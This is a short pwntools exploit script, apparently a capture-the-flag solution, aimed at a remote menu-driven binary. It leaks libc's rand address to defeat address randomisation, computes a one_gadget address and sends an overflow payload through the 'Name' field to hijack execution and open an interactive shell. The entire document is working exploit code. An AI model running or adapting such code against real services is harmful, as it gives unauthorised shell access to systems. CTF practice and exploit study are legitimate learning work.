#!/usr/bin/env python
from pwn import *
import sys

libc = ELF("libc.so.6")

r = remote(sys.argv[1], int(sys.argv[2]))
r.sendline('A'*26)
r.sendlineafter("Print Stats", '5')
r.readuntil("$")

rand = int(r.readline().strip())
libc_base = rand - libc.symbols["rand"]
one_gadget = libc_base + 0x3cbea

r.sendlineafter("Print Stats", '3')
r.sendlineafter("Print Stats", '1')
r.sendlineafter("Name: ", 'A'*20 + p32(one_gadget))
r.sendlineafter("Print Stats", '2')
r.interactive()
